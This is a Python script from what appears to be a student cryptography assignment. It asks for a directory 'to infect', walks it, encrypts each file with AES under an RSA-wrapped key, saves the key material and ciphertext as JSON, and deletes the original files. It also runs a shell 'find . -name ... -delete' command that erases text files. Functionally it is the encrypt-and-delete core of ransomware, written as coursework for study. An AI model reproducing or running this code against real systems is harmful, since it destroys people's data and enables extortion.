#@author: Jasmin Agustin & Nikki Nguyen
#CECS 378 File Encryption with HMAC Assignment

import os, sys, json, base64, subprocess
from generateKeys import generateKeys, checkKeys
from RSAEncryption import MyRSAEncrypt
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives import hashes, hmac
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import asymmetric


def repositoryWalk():
    data = {}
    newdir = raw_input("enter a project directory to infect: ")
    jsonpath = raw_input("enter a directory to save the .json files: ")

    os.chdir(newdir)
    print("current directory: " + os.getcwd())
    RSA_Publickey_filepath, RSA_Privatekey_filepath = checkKeys()
    for root, dirs, files in os.walk(newdir):
        if ".DS_Store" in files:
            files.remove(".DS_Store")
        for d in dirs:
            print (os.path.relpath(os.path.join(root, d), "."))
        for f in files:
            ff = (os.path.relpath(os.path.join(root, f), "."))
            if not f.endswith(('.json', '.pem', '.py', '__')):
                RSACipher, ct, iv, tag, extension = MyRSAEncrypt(ff, RSA_Publickey_filepath)

                #JSON only supports unicode strings. Since Base64 encodes bytes to ASCII-only bytes, you can use that codec to decode the data
                data['RSACipher'] = base64.b64encode(RSACipher).decode('ascii')
                data['ct'] = base64.b64encode(ct).decode('ascii')
                data['iv'] = base64.b64encode(iv).decode('ascii')
                data['tag'] = base64.b64encode(tag).decode('ascii')
                data['extension'] = base64.b64encode(extension).decode('ascii')
                filename,extension = os.path.splitext(f)
                json_file = os.path.join(jsonpath + filename + "_encryption_.json")
                print(json_file)

                with open(json_file, 'w') as jsonfile:
                    json.dump(data,jsonfile)

                if not ff.endswith(('.json','.pem')):
                    os.remove(ff)
                    #DO SYSTEM CALL RELATIVE PATH
                    #rm -r *.txt
                    #find . -name '*.txt' -delete
    #***WARNING*** BE VERY CAREFUL YOU ARE IN THE RIGHT DIRECTORY.
    #I do not recommend doing this unless you are sure your cwd is correct
    os.system("find . -name '*txt' -delete")


repositoryWalk()
